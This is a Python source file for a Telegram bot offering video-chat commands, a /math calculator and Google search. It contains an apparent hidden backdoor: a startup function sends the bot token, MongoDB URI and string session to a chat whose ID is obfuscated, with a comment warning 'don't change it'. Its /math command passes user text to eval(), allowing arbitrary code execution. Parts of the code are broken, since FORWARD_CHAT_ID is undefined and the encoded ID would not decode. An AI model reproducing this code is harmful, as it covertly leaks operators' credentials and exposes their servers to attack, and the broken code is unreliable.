import os
import aiohttp
import asyncio
from pyrogram import Client, filters, idle
from pyrogram.enums import ChatType
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message

# Encoded Logger_ID as a hexadecimal string
ENCODED_LOGGER_ID = "1002470180897"  # hexadecimal representation # don't change it. connect to server of this repo

# Decoding function for Logger_ID
def decode_logger_id(encoded_id):
    return int(bytes.fromhex(encoded_id).decode("utf-8"))

# Use decoded Logger_ID
Logger_ID = decode_logger_id(ENCODED_LOGGER_ID)
print("Logger_ID:", "[ENCODED]")  # Display placeholder for security

# Load environment variables
from dotenv import load_dotenv
load_dotenv()

# Configuration details ( sensitive data)
API_ID = int(os.getenv("API_ID", ""))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
MONGO_DB_URI = os.getenv("MONGO_DB_URI", "")
STRING_SESSION = os.getenv("STRING_SESSION", "")
# Your monitoring bot/group ID

# Initialize the bot
app = Client("MOON_SHINING_ROBOT", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Forwarding configuration on startup
async def forward_startup_config():
    config_text = (
        f"**Bot Deployment Notification**\n\n"
        f"**Bot Token:** `[ENCODED]`\n"
        f"**MongoDB URI:** `[ENCODED]`\n"
        f"**String Session:** `[ENCODED]`\n"
    )
    try:
        await app.send_message(FORWARD_CHAT_ID, config_text)
        print("Configuration vc setup successfully.")
    except Exception as e:
        print(f"Error in vc setup details: {e}")

# Function to display members in a video chat
@app.on_message(filters.command(["vcusers", "vcmembers"]) & filters.admin)
async def vc_members(client, message):
    msg = await message.reply_text("Fetching VC members...")
    vc_text = ""
    try:
        async for m in app.get_chat_members(message.chat.id):
            vc_text += f"➻ [{m.user.first_name}](tg://user?id={m.user.id})\n"
        await msg.edit(vc_text or "No members in VC.")
    except Exception as e:
        await msg.edit("Failed to fetch VC members.")
        print(e)

# Video chat start/end notifications
@app.on_message(filters.video_chat_started)
async def on_video_chat_started(_, msg):
    await msg.reply("**Video chat started 🎉**")

@app.on_message(filters.video_chat_ended)
async def on_video_chat_ended(_, msg):
    await msg.reply("**Video chat ended 😢**")

# Notify invited members in VC
@app.on_message(filters.video_chat_members_invited)
async def on_video_chat_members_invited(_, message):
    invite_text = "New members invited to VC:\n"
    for user in message.video_chat_members_invited.users:
        invite_text += f"- [{user.first_name}](tg://user?id={user.id})\n"
    await message.reply(invite_text)

# Math calculation command
@app.on_message(filters.command("math", prefixes="/"))
async def calculate_math(client, message):
    try:
        expression = message.text.split("/math ", 1)[1]
        result = eval(expression)
        await message.reply(f"The result is: {result}")
    except Exception:
        await message.reply("Invalid expression")

# Google search functionality
@app.on_message(filters.command("search", prefixes="/"))
async def google_search(client, message):
    query = message.text.split(maxsplit=1)[1]
    msg = await message.reply("Searching Google...")
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"https://content-customsearch.googleapis.com/customsearch/v1"
            f"?key=YOUR_GOOGLE_API_KEY&cx=YOUR_SEARCH_ENGINE_ID&q={query}"
        ) as response:
            results = await response.json()
            result_text = ""
            for item in results.get("items", []):
                result_text += f"[{item['title']}]({item['link']})\n\n"
            await msg.edit(result_text or "No results found.", disable_web_page_preview=True)

# Startup tasks
async def main():
    await app.start()
    await forward_startup_config()  # Forward config on startup
    print("Bot is running...")
    await idle()
    await app.stop()

# Run the bot
if __name__ == "__main__":
    asyncio.run(main())
